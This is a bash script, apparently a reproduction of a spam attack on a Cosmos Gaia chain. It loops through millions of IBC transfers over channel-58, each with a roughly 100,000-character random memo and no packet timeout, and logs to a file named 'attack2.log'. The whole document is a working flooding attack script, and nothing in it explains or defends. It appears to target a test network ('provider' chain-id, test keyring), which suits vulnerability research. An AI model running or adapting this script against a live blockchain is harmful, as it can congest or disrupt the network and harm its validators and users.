set -ue

SEQUENCE=$(curl http://127.0.0.1:1317/cosmos/auth/v1beta1/accounts/cosmos1fjzgfyt8way9sp7hktnv2jv73j697gvz3fyptm | jq --raw-output ' .account.sequence ')


for i in $( eval echo {"$SEQUENCE"..10000000} )

do

	gaiad tx ibc-transfer transfer transfer channel-58 cosmos1fjzgfyt8way9sp7hktnv2jv73j697gvz3fyptm 1uatom --from test2 --keyring-backend test --home ~/.gaia-rs --memo $(openssl rand -hex 50000) --chain-id provider --gas 1109809 --yes --fees 2775uatom --sequence $i  --packet-timeout-timestamp 0 &> attack2.log

cat attack2.log

	if [ $(grep -c "mismatch" attack2.log) -eq 1 ]
	then
		echo "sequence number mismatch"
		break
	fi

done

echo "if you're running it right the script just restarted"
